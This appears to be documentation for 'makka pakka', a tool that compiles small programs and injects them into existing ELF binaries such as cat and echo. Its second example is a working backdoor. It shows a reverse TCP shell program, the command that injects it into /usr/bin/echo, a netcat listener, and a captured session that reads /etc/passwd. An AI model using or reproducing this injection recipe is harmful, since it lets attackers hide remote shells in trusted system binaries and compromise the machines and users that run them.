**Examples**
============
This page shows some examples of makka pakka programs, and how they can be
compiled into a target binary.

Logging to Stdout
^^^^^^^^^^^^^^^^^
**Program file**

.. code-block::

    !link stdlib/syscall.mkpk

    [[data]]
    message: "Hello, world!"

    [[code]]
    [main]
    > sys_write "message" 14
    > sys_exit

**Compilation**

.. code-block:: bash

    mkpk stdlib_write.mkpk /usr/bin/cat -o cat_write -e

| **Usage**

Currently the exit process patching only works for sys::exit, and not for
sys::exit_group. Most ELF binaries use a mixture of the two, so finding a code
path that runs the injected code is a matter of trying a few different
arguments. This is a bug, and will be fixed in a future version. For now, the
cat binary runs the injected code with the --help argument.

.. code-block::

    ./cat_write --help
    Usage: ./cat_write [OPTION]... [FILE]...
    Concatenate FILE(s) to standard output.

    With no FILE, or when FILE is -, read standard input.

    -A, --show-all           equivalent to -vET
    -b, --number-nonblank    number nonempty output lines, overrides -n
    -e                       equivalent to -vE
    -E, --show-ends          display $ at end of each line
    -n, --number             number all output lines
    -s, --squeeze-blank      suppress repeated empty output lines
    -t                       equivalent to -vT
    -T, --show-tabs          display TAB characters as ^I
    -u                       (ignored)
    -v, --show-nonprinting   use ^ and M- notation, except for LFD and TAB
        --help     display this help and exit
        --version  output version information and exit

    Examples:
    ./cat_write f - g  Output f's contents, then standard input, then g's contents.
    ./cat_write        Copy standard input to standard output.

    GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
    Report any translation bugs to <https://translationproject.org/team/>
    Full documentation <https://www.gnu.org/software/coreutils/cat>
    or available locally via: info '(coreutils) cat invocation'
    Hello, world!

Reverse TCP Shell
^^^^^^^^^^^^^^^^^
**Program File**

.. code-block::

    !link stdlib/network.mkpk
    !link stdlib/syscall.mkpk
    !link stdlib/execve.mkpk

    [[data]]
    exit_msg: "Connection Terminated"
    # 5555 in little endian.
    port: 0xb315
    # 127.0.0.1 in little endian.
    addr: 0x0100007f

    [[code]]
    [main]
    > socket
    > connect "addr" "port"
    > dup2
    > bin_sh
    > sys_write "exit_msg" 22
    > sys_exit

**Compilation**

.. code-block::

    mkpk reverse_tcp.mkpk /usr/bin/echo -n
    Injecting assembly from /tmp/41462f2f-9c7c-4b8f-9848-c7d2621296d5.asm into .
    Injected file output to /tmp/ce38b9c2-7d82-4e64-bf9c-db8a4c7a7d99.

| **Usage**

In a seperate terminal:

.. code-block::

    nc -l localhost 5555

Then run the inject echo binary:

.. code-block::

    /tmp/ce38b9c2-7d82-4e64-bf9c-db8a4c7a7d99

Now the netcat listener has a remote tcp shell.

.. code-block::

    nc -l localhost 5555
    whoami
    alex
    cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
    systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    syslog:x:104:111::/home/syslog:/usr/sbin/nologin
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    uuidd:x:106:112::/run/uuidd:/usr/sbin/nologin
    tcpdump:x:107:113::/nonexistent:/usr/sbin/nologin
    alex:x:1000:1000:,,,:/home/alex:/bin/bash

.. seealso::
    - :doc:`installation`
    - :doc:`usage`
    - :doc:`language_spec`
